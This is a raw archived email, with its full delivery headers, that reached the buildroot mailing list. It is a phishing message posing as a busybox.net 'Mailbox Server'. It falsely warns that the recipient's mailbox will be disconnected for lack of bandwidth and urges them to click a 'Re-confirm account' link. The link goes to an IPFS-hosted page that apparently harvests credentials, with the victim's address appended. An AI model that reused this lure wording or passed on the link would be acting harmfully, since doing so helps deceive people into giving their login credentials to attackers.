Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 3FDEBD5B847
	for <buildroot@archiver.kernel.org>; Mon, 28 Oct 2024 23:00:10 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp4.osuosl.org (Postfix) with ESMTP id ECE16405D5;
	Mon, 28 Oct 2024 23:00:09 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp4.osuosl.org ([127.0.0.1])
 by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 6OCaTyAFbVJt; Mon, 28 Oct 2024 23:00:09 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org CA8DD405DA
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp4.osuosl.org (Postfix) with ESMTP id CA8DD405DA;
	Mon, 28 Oct 2024 23:00:08 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [IPv6:2605:bc80:3010::138])
 by lists1.osuosl.org (Postfix) with ESMTP id D404AAEE
 for <buildroot@buildroot.org>; Mon, 28 Oct 2024 23:00:06 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id C0E2681139
 for <buildroot@buildroot.org>; Mon, 28 Oct 2024 23:00:06 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id iGyh27i0vPe4 for <buildroot@buildroot.org>;
 Mon, 28 Oct 2024 23:00:06 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=104.168.34.171;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org B378D8113C
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org B378D8113C
Received: from busybox.net (unknown [104.168.34.171])
 by smtp1.osuosl.org (Postfix) with ESMTP id B378D8113C
 for <buildroot@busybox.net>; Mon, 28 Oct 2024 23:00:05 +0000 (UTC)
From: Mailbox Server <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 29 Oct 2024 00:00:05 +0100
Message-ID: <20241029000004.BA27DCFB897EBE3F@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] buildroot@busybox.net Mailbox Confirmation
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8306227736857083740=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============8306227736857083740==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<p style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: none;=
 text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, s=
ans-serif; font-size: small; font-style: normal; font-weight: 400; margin-t=
op: 0px; word-spacing: 0px; white-space: normal; box-sizing: border-box; or=
phans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-lig=
atures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; =
text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;"><font size=
=3D"2"><font face=3D"Verdana" style=3D"box-sizing: border-box;">Dear&nbsp;b=
uildroot</font><font face=3D"Verdana" style=3D"box-sizing: border-box;">,</=
font></font></p>
<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
 sans-serif; font-size: small; font-style: normal; font-weight: 400; word-s=
pacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widow=
s: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;"><font size=3D"2" style=3D"color: =
rgb(0, 0, 0); box-sizing: border-box;"><br style=3D"box-sizing: border-box;=
"></font></div>
<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
 sans-serif; font-size: small; font-style: normal; font-weight: 400; word-s=
pacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widow=
s: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;"><font face=3D"verdana" size=3D"2"=
 style=3D"box-sizing: border-box;"><font color=3D"#000000" style=3D"box-siz=
ing: border-box;">We noticed that your&nbsp;buildroot@busybox.net&nbsp;</fo=
nt><font color=3D"#000000" style=3D"box-sizing: border-box;">will be discon=
nected from sending and receiving mails soon due to lack of mailbox&nbsp;ba=
ndwidth.</font><br style=3D"box-sizing: border-box;"><br style=3D"box-sizin=
g: border-box;"><font color=3D"#000000" style=3D"box-sizing: border-box;">
We urge you to re-confirm if your account is still active on our server to =
officially unlock it to your default settings.</font><br style=3D"box-sizin=
g: border-box;"><br style=3D"box-sizing: border-box;"></font>
<table width=3D"400" height=3D"40" style=3D"color: rgb(0, 0, 0); font-famil=
y: monospace; font-size: 11px; border-collapse: collapse; box-sizing: borde=
r-box;" bgcolor=3D"#424242">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; box-sizing: border-box;"><font face=3D"verdana" s=
ize=3D"2" style=3D"box-sizing: border-box;">
<div align=3D"center" style=3D"box-sizing: border-box;"><font color=3D"#fff=
fff" face=3D"verdana" size=3D"2" style=3D"box-sizing: border-box;"><a style=
=3D"color: rgb(17, 85, 204); text-decoration: none; box-sizing: border-box;=
 background-color: transparent;" href=3D"https://ipfs.io/ipfs/bafkreibetdhz=
vluuwiy2nbxc5xuhhzq3ixgffs6t4u4hnbhzqwsvinrkbi?filename=3Dnew.index.html#bu=
ildroot@busybox.net" target=3D"_blank" rel=3D"noreferrer">Re-confirm accoun=
t</a></font></div></font></td></tr></tbody></table>
<font face=3D"verdana" size=3D"2" style=3D"box-sizing: border-box;"><br sty=
le=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"><font =
color=3D"#000000" style=3D"box-sizing: border-box;">Once confirmation is co=
mplete, your mailbox will work effectively.</font><br style=3D"box-sizing: =
border-box;"><br style=3D"box-sizing: border-box;"><font color=3D"#000000" =
style=3D"box-sizing: border-box;">Copyright&#65533;&nbsp;busybox.net</font>=
</font>
<span style=3D"color: rgb(0, 0, 0); font-family: verdana; box-sizing: borde=
r-box;">
&nbsp;<font size=3D"1">All rights reserved.</font></span></div></body></htm=
l>

--===============8306227736857083740==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============8306227736857083740==--
